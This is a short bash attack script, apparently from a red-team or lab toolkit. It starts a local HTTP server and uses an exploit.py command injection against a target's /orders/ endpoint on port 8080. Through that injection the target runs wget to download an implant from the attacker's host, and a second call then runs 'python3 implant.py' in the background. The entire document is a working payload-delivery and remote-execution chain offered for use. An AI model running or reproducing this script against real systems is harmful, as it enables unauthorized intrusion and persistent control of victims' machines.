#!/bin/bash

#CONFIG
PORT=8000
IMPLANT_FILE=$2
TARGET_IP=$1

#GET LOCAL IP (MacOS & Linux supported)
if [[ "$OSTYPE" == "darwin"* ]]; then
	LOCAL_IP=$(ipconfig getifaddr en0)
else
	LOCAL_IP=$(hostname -I | awk '{print $1}')
fi

#START PYTHON SERVER
echo "[*] Starting HTTP server at $LOCAL_IP:$PORT"
python3 -m http.server $PORT > /dev/null 2>&1 &
SERVER_PID=$!
sleep 2


#UPLOAD IMPLANT
echo "[*] Uploading implant to target..."
python3 exploit.py "http://$TARGET_IP:8080/orders/" "wget http://$LOCAL_IP:$PORT/$IMPLANT_FILE"

#KILL SERVER
echo "[*] Implant uploaded, stopping HTTP server..."
kill $SERVER_PID

#RUN IMPLANT
echo "[*] Starting implant..."
python3 exploit.py "http://$TARGET_IP:8080/orders/" "python3 implant.py" > /dev/null 2>&1 &
echo "[*] COMPLETED"
echo "[*] IMPLANT IS RUNNING ON TARGET UNTIL SHUTDOWN SIGNAL IS RECEIVED"
